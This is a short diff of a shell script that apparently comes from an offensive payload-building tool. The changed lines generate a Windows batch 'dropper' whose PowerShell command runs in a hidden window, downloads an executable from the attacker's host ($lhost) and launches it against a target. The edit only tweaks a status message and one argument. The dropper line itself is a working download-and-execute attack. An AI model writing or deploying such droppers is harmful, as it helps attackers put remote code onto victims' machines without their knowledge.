@@ -11316,9 +11316,9 @@ fi
 
 
 ## Build batch dropper
-echo "[☠] Building batch dropper: $N4m.bat ..";sleep 2
+echo "[☠] Building batch dropper '$N4m.bat' ..";sleep 2
 echo "@echo off" > $IPATH/output/$N4m.bat
-echo "powershell -w 1 -C (new-Object Net.WebClient).DownloadFile('http://$lhost/$slave.exe', '$rpath\\$slave.exe') && start $rpath\\$slave.exe -t $IP -d 500 -b 30 -s 128" >> $IPATH/output/$N4m.bat
+echo "powershell -w 1 -C (new-Object Net.WebClient).DownloadFile('http://$lhost/$slave.exe', '$rpath\\$slave.exe') && start $rpath\\$slave.exe -t $lhost -d 500 -b 30 -s 128" >> $IPATH/output/$N4m.bat
 echo "exit" >> $IPATH/output/$N4m.bat
 
 
